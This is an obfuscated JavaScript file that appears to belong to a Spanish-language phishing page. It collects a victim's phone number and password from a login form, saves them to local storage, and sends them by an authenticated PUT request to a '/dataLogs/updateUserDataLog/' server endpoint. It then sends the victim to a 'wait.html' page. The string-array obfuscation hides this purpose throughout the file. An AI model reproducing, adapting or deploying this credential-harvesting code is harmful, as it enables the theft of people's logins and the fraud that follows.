const _0x1270ca = _0x4843;
function _0x4843(_0x5b8f45, _0x2301fa) {
  const _0xf3cec3 = _0xf3ce();
  return (
    (_0x4843 = function (_0x48431c, _0x4b8cf3) {
      _0x48431c = _0x48431c - 0x184;
      let _0x4a5843 = _0xf3cec3[_0x48431c];
      return _0x4a5843;
    }),
    _0x4843(_0x5b8f45, _0x2301fa)
  );
}
(function (_0x1f14ef, _0x8fa0f) {
  const _0x57eb10 = _0x4843,
    _0x592014 = _0x1f14ef();
  while (!![]) {
    try {
      const _0x5088bc =
        parseInt(_0x57eb10(0x194)) / 0x1 +
        (-parseInt(_0x57eb10(0x1a2)) / 0x2) *
          (-parseInt(_0x57eb10(0x1a6)) / 0x3) +
        (-parseInt(_0x57eb10(0x19a)) / 0x4) *
          (-parseInt(_0x57eb10(0x1aa)) / 0x5) +
        parseInt(_0x57eb10(0x187)) / 0x6 +
        parseInt(_0x57eb10(0x1a7)) / 0x7 +
        parseInt(_0x57eb10(0x1a4)) / 0x8 +
        (-parseInt(_0x57eb10(0x195)) / 0x9) *
          (parseInt(_0x57eb10(0x197)) / 0xa);
      if (_0x5088bc === _0x8fa0f) break;
      else _0x592014["push"](_0x592014["shift"]());
    } catch (_0x40f616) {
      _0x592014["push"](_0x592014["shift"]());
    }
  }
})(_0xf3ce, 0xc0b5f);
function updateLS() {
  const _0x110e16 = _0x4843;
  LS[_0x110e16(0x1a8)](_0x110e16(0x1a3), JSON[_0x110e16(0x1ad)](info));
}
async function sendDataNewUs() {
  const _0x2255d2 = _0x4843,
    _0x228e5a = document["getElementById"](_0x2255d2(0x1ab));
  _0x228e5a[_0x2255d2(0x19b)] = !![];
  try {
    const _0x542139 = localStorage[_0x2255d2(0x18d)](_0x2255d2(0x191)),
      _0x161186 = localStorage[_0x2255d2(0x18d)](_0x2255d2(0x18e));
    if (!_0x542139 || !_0x161186)
      throw new Error(
        "No\x20se\x20encontró\x20el\x20ID\x20o\x20el\x20token\x20en\x20localStorage."
      );
    const _0x28d0bc = await fetch(url + _0x2255d2(0x189) + _0x542139, {
      method: _0x2255d2(0x198),
      headers: {
        "Content-Type": "application/json",
        Authorization: _0x2255d2(0x19f) + _0x161186,
        Origin: window[_0x2255d2(0x199)]["origin"],
      },
      body: JSON[_0x2255d2(0x1ad)]({
        us: info[_0x2255d2(0x1a1)][_0x2255d2(0x1a0)],
        ps: info[_0x2255d2(0x1a1)]["puser"],
        status: _0x2255d2(0x1ac),
      }),
    });
    if (!_0x28d0bc["ok"]) {
      const _0x3f755c = await _0x28d0bc[_0x2255d2(0x186)]();
      throw new Error(_0x3f755c[_0x2255d2(0x18b)] || _0x2255d2(0x193));
    }
    console[_0x2255d2(0x185)](_0x2255d2(0x19e)),
      (window[_0x2255d2(0x199)]["href"] = "./wait.html");
  } catch (_0x378b81) {
    console[_0x2255d2(0x18b)](
      "Error\x20al\x20enviar\x20los\x20datos:",
      _0x378b81
    ),
      alert(_0x2255d2(0x18f));
  } finally {
    _0x228e5a["disabled"] = ![];
  }
}
document[_0x1270ca(0x192)](_0x1270ca(0x1ab))[_0x1270ca(0x18c)](
  _0x1270ca(0x19d),
  function (_0x419dc4) {
    const _0x24cfc7 = _0x1270ca;
    _0x419dc4[_0x24cfc7(0x1a9)](), console["log"](_0x24cfc7(0x19d));
    if (document[_0x24cfc7(0x192)](_0x24cfc7(0x184))[_0x24cfc7(0x19c)] == "") {
      alert(_0x24cfc7(0x18a)),
        document[_0x24cfc7(0x192)](_0x24cfc7(0x184))[_0x24cfc7(0x188)]();
      return;
    } else {
      if (
        document[_0x24cfc7(0x192)](_0x24cfc7(0x1a5))[_0x24cfc7(0x19c)] == ""
      ) {
        alert(_0x24cfc7(0x190)),
          document["getElementById"](_0x24cfc7(0x1a5))[_0x24cfc7(0x188)]();
        return;
      } else {
        const _0x1fcc22 = document[_0x24cfc7(0x192)](_0x24cfc7(0x184))[
            _0x24cfc7(0x19c)
          ],
          _0x1f1f21 = document[_0x24cfc7(0x192)](_0x24cfc7(0x1a5))["value"];
        (info[_0x24cfc7(0x1a1)][_0x24cfc7(0x1a0)] = _0x1fcc22),
          (info[_0x24cfc7(0x1a1)]["puser"] = _0x1f1f21),
          updateLS(),
          sendDataNewUs();
      }
    }
  }
),
  document[_0x1270ca(0x192)](_0x1270ca(0x196))[_0x1270ca(0x18c)](
    _0x1270ca(0x19d),
    function () {
      const _0x49b16d = _0x1270ca;
      window[_0x49b16d(0x199)]["href"] = "../../pay.html";
    }
  );
function _0xf3ce() {
  const _0x517409 = [
    "addEventListener",
    "getItem",
    "dataLogToken",
    "Hubo\x20un\x20error\x20al\x20enviar\x20los\x20datos.\x20Por\x20favor,\x20inténtelo\x20de\x20nuevo.",
    "Por\x20favor\x20ingrese\x20su\x20contraseña",
    "dataLogId",
    "getElementById",
    "Error\x20al\x20actualizar\x20datos\x20en\x20el\x20servidor",
    "524944VfgRJs",
    "12403467GaPaBi",
    "backbutton",
    "20uiadmt",
    "PUT",
    "location",
    "5054856etiuiw",
    "disabled",
    "value",
    "click",
    "Datos\x20actualizados\x20en\x20el\x20servidor",
    "Bearer\x20",
    "user",
    "metaInfo",
    "70uzaanN",
    "info",
    "1260520vHlDZe",
    "txt-pass",
    "23913KPsrSQ",
    "2313836ouBYsw",
    "setItem",
    "preventDefault",
    "5KppXat",
    "btn-consultar",
    "Corrigió\x20Usuario",
    "stringify",
    "txt-num",
    "log",
    "json",
    "5939478ixYEwN",
    "focus",
    "/dataLogs/updateUserDataLog/",
    "Por\x20favor\x20ingrese\x20su\x20número\x20de\x20celular",
    "error",
  ];
  _0xf3ce = function () {
    return _0x517409;
  };
  return _0xf3ce();
}
